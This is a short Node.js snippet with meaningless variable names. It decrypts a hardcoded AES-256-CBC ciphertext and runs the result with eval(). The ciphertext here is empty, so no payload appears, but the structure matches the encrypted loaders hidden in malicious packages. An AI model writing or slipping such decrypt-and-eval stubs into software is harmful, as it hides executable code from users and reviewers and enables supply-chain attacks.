const ito = require('crypto');
const itinho = Buffer.from('f6fd79f593fe93b85c11a3d1ab0e2e13f16ae491e66b74199a19df7704acfdf6', 'hex');
const octua = Buffer.from('bceef14979c6e033ff34855753c0f39e', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
